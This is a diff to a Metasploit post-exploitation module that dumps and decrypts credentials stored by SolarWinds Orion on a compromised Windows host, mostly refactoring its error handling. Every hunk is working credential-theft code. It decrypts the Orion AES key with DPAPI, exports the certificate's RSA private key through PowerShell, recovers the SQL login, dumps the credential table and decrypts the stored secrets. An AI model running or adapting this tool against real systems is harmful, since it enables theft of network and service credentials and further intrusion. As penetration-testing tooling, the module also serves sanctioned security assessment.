@@ -29,7 +29,7 @@ class MetasploitModule < Msf::Post
           of the source code and technical information published by Djordje Atlialp and
           Atredis Partners.
         },
-        'Author' => 'npm[at]cesium137.io',
+        'Author' => [ 'npm[at]cesium137.io', 'djordje.atlialp@gmail.com', 'https://atredis.com' ],
         'Platform' => [ 'win' ],
         'DisclosureDate' => '2022-11-08',
         'SessionTypes' => [ 'meterpreter' ],
@@ -86,11 +86,11 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not initialize') unless init_module
+    init_module
     current_action = action.name.downcase
     if current_action == 'export' || current_action == 'dump'
       print_status('Performing export of SolarWinds Orion SQL database to CSV file')
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not export SolarWinds Orion database records') unless (encrypted_csv_file = export)
+      encrypted_csv_file = export
       print_good("Encrypted SolarWinds Orion Database Dump: #{encrypted_csv_file}")
     end
     if current_action == 'decrypt' || current_action == 'dump'
@@ -100,16 +100,14 @@ class MetasploitModule < Msf::Post
       fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid CSV input file') unless ::File.file?(encrypted_csv_file)
 
       print_status('Performing decryption of SolarWinds Orion SQL database')
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not decrypt exported SolarWinds Orion database records') unless (decrypted_csv_file = decrypt(encrypted_csv_file))
+      decrypted_csv_file = decrypt(encrypted_csv_file)
       print_good("Decrypted SolarWinds Orion Database Dump: #{decrypted_csv_file}")
     end
   end
 
   def export
-    unless (csv = dump_orion_db)
-      print_error('No records exported from SQL server')
-      return false
-    end
+    csv = dump_orion_db
+
     total_rows = csv.count
     print_good("#{total_rows} rows exported, #{@orion_total_secrets} unique CredentialIDs")
     encrypted_data = csv.to_s.delete("\000")
@@ -117,10 +115,7 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt(csv_file)
-    unless (csv = read_csv_file(csv_file))
-      print_error('No records imported from CSV dataset')
-      return false
-    end
+    csv = read_csv_file(csv_file)
     total_rows = csv.count
     print_good("#{total_rows} rows loaded, #{@orion_total_secrets} unique CredentialIDs")
     result = decrypt_orion_db(csv)
@@ -130,15 +125,12 @@ class MetasploitModule < Msf::Post
     orion_plaintext_rows = result[:plaintext_rows]
     orion_failed_rows = result[:failed_rows]
     result_rows = result[:result_csv]
-    unless result_rows
-      print_error('Failed to decrypt CSV dataset')
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::Unknown, 'Failed to decrypt CSV dataset') unless result_rows
+
     total_result_rows = result_rows.count - 1 # Do not count header row
     total_result_secrets = result_rows['CredentialID'].uniq.count - 1
     if orion_processed_rows == orion_failed_rows || total_result_rows <= 0
-      print_error('No rows could be processed')
-      return false
+      fail_with(Msf::Exploit::Failure::Unknown, 'No rows could be processed')
     elsif orion_failed_rows > 0
       print_warning("#{orion_processed_rows} rows processed (#{orion_failed_rows} rows failed)")
     else
@@ -166,18 +158,14 @@ class MetasploitModule < Msf::Post
     print_status('Export SolarWinds Orion DB ...')
     query_result = cmd_exec(sql_cmd)
     if query_result.downcase.start_with?('sqlcmd: error:')
-      print_error(query_result)
-      return false
+      fail_with(Msf::Exploit::Failure::Unknown, query_result)
     end
     csv = ::CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
-    unless csv
-      print_error('Error parsing SQL dataset into CSV format')
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::Unknown, 'Error parsing SQL dataset into CSV format') unless csv
+
     @orion_total_secrets = csv['CredentialID'].uniq.count
     unless @orion_total_secrets >= 1 && !csv['CredentialID'].uniq.first.nil?
-      print_error('SQL dataset contains no CredentialID column values')
-      return false
+      fail_with(Msf::Exploit::Failure::Unknown, 'SQL dataset contains no CredentialID column values')
     end
     csv
   end
@@ -213,7 +201,7 @@ class MetasploitModule < Msf::Post
       secret_encrypted = row['Encrypted'].to_i
       if secret_encrypted == 1
         decrypt_result = orion_secret_decrypt(secret_ciphertext)
-        if decrypt_result
+        if !decrypt_result.nil?
           secret_plaintext = decrypt_result['Plaintext']
           decrypt_method = decrypt_result['Method']
         else
@@ -225,12 +213,6 @@ class MetasploitModule < Msf::Post
         if secret_plaintext.nil?
           vprint_warning("CredentialID #{credential_id} name '#{secret_name}' decrypted Value nil, excluding")
           blank_rows += 1
-          next
-        end
-        if !secret_plaintext
-          print_error("CredentialID #{credential_id} field '#{secret_name}' failed to decrypt")
-          vprint_error(row.to_s)
-          failed_rows += 1
           next
         end
         secret_disposition = "decrypted #{decrypt_method}"
@@ -262,8 +244,8 @@ class MetasploitModule < Msf::Post
   end
 
   def init_module
-    @orion_hostname = get_env('COMPUTERNAME')
-    print_status("Hostname #{@orion_hostname} IPv4 #{rhost}")
+    orion_hostname = get_env('COMPUTERNAME')
+    print_status("Hostname #{orion_hostname} IPv4 #{rhost}")
     require_sql = action.name.downcase == 'export' || action.name.downcase == 'dump' # only need to be concerned with SQL if doing these actions
     if require_sql
       # TODO: Orion does not install SSMS / sqlcmd by default if it is using an external SQL server.
@@ -272,83 +254,49 @@ class MetasploitModule < Msf::Post
       # It may be possible to roll a "SQL client" using PowerShell provided we can stick to native
       # cmdlets but I am not 100% sure that is not reinventing the wheel.
       get_sql_client
-      unless @sql_client == 'sqlcmd'
-        print_error('Unable to identify sqlcmd SQL client on target host')
-        return false
-      end
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
+
       vprint_good("Found SQL client: #{@sql_client}")
     end
     get_orion_version
-    unless @orion_build
-      print_error('Could not determine SolarWinds Orion build')
-      return false
-    end
-    orion_path = get_orion_path
-    unless orion_path
-      print_error('Could not determine SolarWinds Orion install path')
-      return false
-    end
-    return false unless init_orion_encryption
-
-    if require_sql && !init_orion_db(orion_path)
-      return false
-    end
-
-    true
+    init_orion_encryption
+    init_orion_db(get_orion_path) if require_sql
   end
 
   def read_csv_file(file_name)
-    unless File.exist?(file_name)
-      print_error("CSV file #{file_name} not found")
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::NoTarget, "CSV file #{file_name} not found") unless ::File.file?(file_name)
+
     csv_rows = ::File.binread(file_name)
     csv = ::CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
-    unless csv
-      print_error("Error importing CSV file #{file_name}")
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv
+
     @orion_total_secrets = csv['CredentialID'].uniq.count
     unless @orion_total_secrets >= 1 && !csv['CredentialID'].uniq.first.nil?
-      print_error("Provided CSV file #{file_name} contains no CredentialID column values")
-      return false
+      fail_with(Msf::Exploit::Failure::NoTarget, "Provided CSV file #{file_name} contains no CredentialID column values")
     end
     csv
   end
 
   def get_orion_version
     reg_key = 'HKLM\\SOFTWARE\\WOW6432Node\\SolarWinds\\Orion\\Core'
-    unless registry_key_exist?(reg_key)
-      print_error("Registry key #{reg_key} not found")
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
+
     orion_version = registry_getvaldata(reg_key, 'Version')
-    unless orion_version
-      print_error("Could not find Version registry entry under #{reg_key}")
-      return false
-    end
-    orion_build_major = orion_version.split('.')[0]
-    orion_build_minor = orion_version.split('.')[1]
-    orion_build_rev = "#{orion_version.split('.')[2]}#{orion_version.split('.')[3]}"
-    @orion_build = "#{orion_build_major}.#{orion_build_minor}#{orion_build_rev}".to_f
-    unless @orion_build > 0
-      print_error('Error determining SolarWinds Orion version from SQL query')
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find Version registry entry under #{reg_key}") unless orion_version
+
+    @orion_build = ::Rex::Version.new(orion_version)
+    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not parse Orion version information') unless @orion_build > ::Rex::Version.new('0')
+
     print_status("SolarWinds Orion Build #{@orion_build}")
   end
 
   def get_orion_path
     reg_key = 'HKLM\\SOFTWARE\\WOW6432Node\\SolarWinds\\Orion\\Core'
-    unless registry_key_exist?(reg_key)
-      print_error("Registry key #{reg_key} not found")
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
+
     orion_path = registry_getvaldata(reg_key, 'InstallPath').to_s
-    unless orion_path
-      print_error("Could not find InstallPath registry entry under #{reg_key}")
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find InstallPath registry entry under #{reg_key}") unless orion_path
+
     print_status("SolarWinds Orion Install Path: #{orion_path}")
     orion_path
   end
@@ -363,17 +311,15 @@ class MetasploitModule < Msf::Post
   end
 
   def read_config_file(config_file)
-    unless file_exist?(config_file)
-      print_error("Configuration file '#{config_file}' not found or is not accessible")
-      return false
-    end
+    fail_with(Msf::Exploit::Failure::NoTarget, "Configuration file '#{config_file}' not found or is not accessible") unless file_exist?(config_file)
+
     read_file(config_file)
   end
 
   def get_orion_certificate
     print_status('Extract SolarWinds Orion SSL Certificate Private Key ...')
     if datastore['RSA_KEY_FILE']
-      return false unless ::File.file?(datastore['RSA_KEY_FILE'])
+      return nil unless ::File.file?(datastore['RSA_KEY_FILE'])
 
       key_pem = ::File.binread(datastore['RSA_KEY_FILE'])
       @orion_rsa_key = ::OpenSSL::PKey::RSA.new(key_pem)
@@ -388,8 +334,8 @@ class MetasploitModule < Msf::Post
       orion_cert_thumbprint = psh_exec(cmd_str).upcase
     end
     unless orion_cert_thumbprint.match?(/^[0-9A-F]+$/i)
-      print_error('Unable to locate SolarWinds Orion SSL certificate in LocalMachine certificate store')
-      return false
+      print_error('Unable to locate SolarWinds Orion SSL certificate in LocalMachine certificate store, try specifying SHA-1 thumbprint via the CERT_SHA1 advanced option')
+      return nil
     end
     vprint_good("Found SolarWinds Orion RSA private key in x509 certificate with SHA1 thumbprint #{orion_cert_thumbprint}")
     cmd_str = "[Convert]::ToBase64String((
@@ -399,7 +345,7 @@ class MetasploitModule < Msf::Post
     orion_cert_key = psh_exec(cmd_str)
     unless orion_cert_key.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
       print_error("Unable to extract RSA private key for Orion x509 certificate with SHA1 thumbprint #{orion_cert_thumbprint}")
-      return false
+      return nil
     end
     key_b64 = orion_cert_key.scan(/.{1,64}/).join("\n")
     key_pem = "-----BEGIN PRIVATE KEY-----\n#{key_b64}\n-----END PRIVATE KEY-----"
@@ -410,38 +356,48 @@ class MetasploitModule < Msf::Post
     nil
   rescue OpenSSL::PKey::PKeyError
     print_error('Failure during extract of PKCS#1 RSA private key')
-    return false
+    return nil
   end
 
   def init_orion_encryption
     print_status('Init SolarWinds Crypto ...')
     if datastore['AES_KEY']
       unless datastore['AES_KEY'].match?(/^[0-9a-f]+$/i) && datastore['AES_KEY'].length == 64
-        print_error('Provided AES key is not valid 256-bit / 64-byte hexidecimal data')
-        return false
+        fail_with(Msf::Exploit::Failure::BadConfig, 'Provided AES key is not valid 256-bit / 64-byte hexidecimal data')
       end
-      @orion_aes_key_hex = datastore['AES_KEY']
+      orion_aes_key_hex = datastore['AES_KEY']
       @orion_aes_key = [datastore['AES_KEY']].pack('H*')
     else
       print_status('Decrypt SolarWinds CryptoHelper Keystorage ...')
       orion_enc_config_file = "#{get_env('PROGRAMDATA')}\\SolarWinds\\Keystorage\\CryptoHelper\\default.dat"
       vprint_status('CryptoHelper Keystorage file path:')
       vprint_status("\t#{orion_enc_config_file}")
-      return false unless (orion_enc_conf_bytes = read_config_file(orion_enc_config_file))
+      fail_with(Msf::Exploit::Failure::BadConfig, "Error reading database configuration file #{orion_enc_config_file}") unless (orion_enc_conf_bytes = read_config_file(orion_enc_config_file))
 
       key_len = orion_enc_conf_bytes[4..7].unpack('l*').first.to_i
-      key_hex_encrypted = orion_enc_conf_bytes[8..key_len + 8].unpack('H*').first.to_s.upcase
-      orion_enc_conf_b64 = ::Base64.strict_encode64([key_hex_encrypted].pack('H*'))
+      key_hex_encrypted = orion_enc_conf_bytes[8..key_len + 8]
+      orion_enc_conf_b64 = ::Base64.strict_encode64(key_hex_encrypted)
       @orion_aes_key = ::Base64.strict_decode64(dpapi_decrypt(orion_enc_conf_b64, nil))
-      @orion_aes_key_hex = @orion_aes_key.unpack('H*').first.to_s.upcase
+      orion_aes_key_hex = @orion_aes_key.unpack('H*').first.to_s.upcase
     end
     print_good('Orion AES Encryption Key')
-    print_good("\tHEX: #{@orion_aes_key_hex}")
+    print_good("\tHEX: #{orion_aes_key_hex}")
+    extra_service_data = {
+      address: ::Rex::Socket.getaddress(rhost),
+      port: 17777,
+      service_name: 'sis',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+      module_fullname: fullname,
+      origin_type: :service,
+      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+      realm_value: ::Rex::Socket.getaddress(rhost)
+    }
+    store_valid_credential(user: 'Orion NPM AES Key', private: orion_aes_key_hex, service_data: extra_service_data)
     get_orion_certificate
     unless @orion_rsa_key
       print_warning('Unable to locate SolarWinds encryption certificate - secrets encrypted with RSA will not be decrypted')
     end
-    true
   end
 
   def init_orion_db(orion_path)
@@ -455,10 +411,7 @@ class MetasploitModule < Msf::Post
       orion_db_config_file = orion_path + 'SWNetPerfMon.DB'
       vprint_status('SWNetPerfMon.DB file path:')
       vprint_status("\t#{orion_db_config_file}")
-      unless (db_conf = get_orion_database_config(read_config_file(orion_db_config_file)))
-        print_error("Error reading database configuration file #{orion_db_config_file}")
-        return false
-      end
+      db_conf = get_orion_database_config(read_config_file(orion_db_config_file))
       db_instance_path = db_conf['DATA SOURCE']
       db_name = db_conf['INITIAL CATALOG']
       db_user = db_conf['USER ID']
@@ -466,14 +419,11 @@ class MetasploitModule < Msf::Post
       if db_pass_enc.nil?
         db_pass = nil
       else
-        # Because the db_conf hash was created by split('='), Base64 values will lose their padding if they had any.
-        # .NET [System.Convert] requires Base64 input to be strictly RFC 4648 compliant, so we must manually pad
-        db_pass = ::Base64.strict_decode64(dpapi_decrypt(b64_pad(db_pass_enc.gsub('"', '')), 'AgABAgADAAk=')) # static entropy
+        db_pass = ::Base64.strict_decode64(dpapi_decrypt(db_pass_enc.gsub('"', ''), 'AgABAgADAAk=')) # static entropy
       end
       db_auth = db_conf['INTEGRATED SECURITY']
       if db_instance_path.nil? || db_name.nil?
-        print_error("Failed to recover database parameters from #{orion_db_config_file}")
-        return false
+        fail_with(Msf::Exploit::Failure::BadConfig, "Failed to recover database parameters from #{orion_db_config_file}")
       end
     end
     @orion_db_instance_path = db_instance_path
@@ -507,44 +457,31 @@ class MetasploitModule < Msf::Post
       print_good("\tDatabase User: #{@orion_db_user}")
       print_good("\tDatabase Pass: #{@orion_db_pass}")
     else
-      print_error("Could not extract SQL login information from #{orion_db_config_file}")
-      return false
+      fail_with(Msf::Exploit::Failure::Unknown, "Could not extract SQL login information from #{orion_db_config_file}")
     end
-    true
   end
 
   def get_orion_database_config(db_conf_bytes)
     res = {}
-    unless (db_str = get_orion_database_string(db_conf_bytes))
-      print_error('Could not extract ConnectionString from binary stream')
-      return false
-    end
+    db_str = get_orion_database_string(db_conf_bytes)
+    fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract ConnectionString from binary stream') unless db_str
+
     db_connection_elements = db_str.split(';')
     db_connection_elements.each do |element|
-      pair = element.to_s.split('=')
+      pair = element.to_s.split('=', 2)
       k = pair[0]
       v = pair[1]
       res[k.upcase] = v
     end
     res
-  rescue StandardError => e
-    vprint_error("Exception in #{__method__}: #{e.message}")
-    return false
   end
 
   def get_orion_database_string(plaintext_conf)
-    return false unless plaintext_conf.match?(/ConnectionString/i)
+    return nil unless plaintext_conf.match?(/ConnectionString/i)
 
-    working_offset = plaintext_conf.index(/ConnectionString/i) + 17
-    working_bytes = []
-    loop do
-      next_char = plaintext_conf[working_offset, 1]
-      break if next_char == "\n"
-
-      working_bytes << next_char
-      working_offset += 1
-    end
-    working_bytes.join
+    start_offset = plaintext_conf.index(/ConnectionString/i) + 17
+    end_offset = plaintext_conf.index("\n", start_offset) - 1
+    plaintext_conf[start_offset..end_offset]
   end
 
   def orion_secret_decrypt(ciphertext)
@@ -552,12 +489,12 @@ class MetasploitModule < Msf::Post
       unless @orion_rsa_key
         print_warning('RSA key unavailable, cannot decrypt XMLSEC ciphertext')
         vprint_warning("Ciphertext: #{ciphertext}")
-        return false
+        return nil
       end
       xmldoc = Nokogiri::XML(ciphertext) do |config|
         config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
       end
-      return false unless xmldoc
+      return nil unless xmldoc
 
       xmldoc.remove_namespaces!
       key_b64 = xmldoc.at_xpath('/EncryptedData/KeyInfo/EncryptedKey/CipherData/CipherValue').text.delete("\000")
@@ -579,7 +516,7 @@ class MetasploitModule < Msf::Post
       unless @orion_rsa_key
         print_warning('RSA key unavailable, cannot decrypt RSA encrypted ciphertext')
         vprint_warning("Ciphertext: #{ciphertext}")
-        return false
+        return nil
       end
       secret_plaintext = @orion_rsa_key.decrypt(::Base64.strict_decode64(ciphertext.to_s))
       secret_method = 'RSA'
@@ -594,11 +531,11 @@ class MetasploitModule < Msf::Post
     end
     return res
   rescue ArgumentError
-    return false
+    return nil
   end
 
   def aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv)
-    return false unless aes_iv.length == 16
+    return nil unless aes_iv.length == 16
 
     case aes_key.length
     when 16
@@ -606,7 +543,7 @@ class MetasploitModule < Msf::Post
     when 32
       decipher = OpenSSL::Cipher.new('aes-256-cbc')
     else
-      return false
+      return nil
     end
     decipher.decrypt
     decipher.key = aes_key
@@ -614,7 +551,7 @@ class MetasploitModule < Msf::Post
     decipher.padding = 1
     decipher.update(ciphertext_bytes) + decipher.final
   rescue OpenSSL::Cipher::CipherError
-    return false
+    return nil
   end
 
   def dpapi_decrypt(b64, entropy)
@@ -639,9 +576,5 @@ class MetasploitModule < Msf::Post
       return nil
     end
     plaintext
-  end
-
-  def b64_pad(b64)
-    ::Base64.strict_encode64(::Base64.decode64(b64))
   end
 end
